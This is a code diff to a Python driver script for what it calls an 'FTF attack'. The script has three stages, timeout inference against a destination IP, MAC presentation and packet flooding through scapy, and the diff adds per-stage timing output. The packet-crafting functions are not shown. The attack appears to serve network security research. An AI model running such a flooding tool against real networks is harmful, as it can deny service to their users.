@@ -4,7 +4,6 @@ import sys
 import json
 import argparse
 import random
-import time
 import csv
 from time import time, sleep
 from scapy.all import sendp
@@ -72,8 +71,13 @@ def main():
     parser.add_argument('--out-file', type=str, default="/tmp/ftf.csv")
     args = parser.parse_args()
 
+    sum_t = 0
     print(f"# [STAGE 0] T_idle Inference, timestamp {int(time())}", flush=True)
+    t0 = int(time())
     hard_timeout, attack_frequency = stage_0(args.dst_ip, args.n, args.t_max)
+    t = int(time()) - t0
+    print(f"# [STAGE 0] delta_t={t} sec", flush=True)
+    sum_t += t
 
     not_exists = not os.path.exists(args.out_file)
     with open(args.out_file, "a+", newline="") as f:
@@ -81,14 +85,23 @@ def main():
         if not_exists:
             writer.writerow(["npacket", "estimated_hard_timeout", "estimated_idle_timeout"])
         writer.writerow([args.npacket, hard_timeout, attack_frequency])
-        
+    
+    t0 = int(time())
     print(f"# [STAGE 1] MAC Presenting, timestamp {int(time())}", flush=True)
     macs = stage_1(args.iface, args.npacket, args.anm, attack_frequency, args.local_ip)
+    t = int(time()) - t0
+    print(f"# [STAGE 1] delta_t={t} sec", flush=True)
+    sum_t += t
 
+    t0 = int(time())
     print(f"# [STAGE 2] Flooding, timestamp {int(time())}", flush=True)
     stage_2(args.iface, args.npacket, args.anp, attack_frequency, macs, args.local_ip)
+    t = int(time()) - t0
+    print(f"# [STAGE 2] delta_t={t} sec", flush=True)
+    sum_t += t
 
     print(f"[+] FTF attack completed, timestamp {int(time())}", flush=True)
+    print(f"# [FTF attack] delta_t={sum_t} sec", flush=True)
     
 if __name__ == '__main__':
     main()
